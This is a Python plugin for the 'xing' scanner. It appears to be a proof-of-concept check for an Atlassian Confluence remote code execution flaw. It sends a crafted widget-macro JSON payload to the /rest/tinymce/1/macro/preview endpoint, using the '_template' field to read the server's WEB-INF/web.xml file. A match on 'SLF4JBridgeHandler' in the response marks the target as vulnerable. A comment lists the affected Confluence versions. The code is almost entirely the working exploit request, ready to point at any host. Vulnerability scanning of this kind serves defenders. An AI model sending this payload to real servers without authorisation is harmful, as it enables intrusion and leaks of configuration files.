from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Atlassian Confluence RCE"
        self.app_name = 'Confluence'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        data = {
            "contentId":"0",
            "macro":{
                "name":"widget",
                "body":"",
                "params":{
                    "url":"http://localhost/www.dailymotion.com/",
                    "width":"300",
                    "height":"200",
                    "_template":"WEB-INF/web.xml"
                }
            }
        }
        '''所有1.xx，2.xx，3.xx，4.xx和5.xx版本
所有6.0.x，6.1.x，6.2.x，6.3.x，6.4.x和6.5.x版本
所有6.7.x，6.8.x，6.9.x，6.10.x和6.11.x版本
6.6.12之前的所有6.6.x版本
6.12.3之前的所有6.12.x版本
6.13.3之前的所有6.13.x版本
6.14.2之前的所有6.14.x版本'''
        headers = {
            "Content-Type": "application/json",
            "Referer": target
        }
        check = b"org.slf4j.bridge.SLF4JBridgeHandler"
        paths = ["/rest/tinymce/1/macro/preview"]
        self.logger.info("verify {}".format(target))
        for path in paths:
            url = target + path
            conn = http_req(url, "post", headers=headers, json=data)
            if check in conn.content and b'confluence' in conn.content:
                self.logger.success("found vul {}".format(url))
                return url
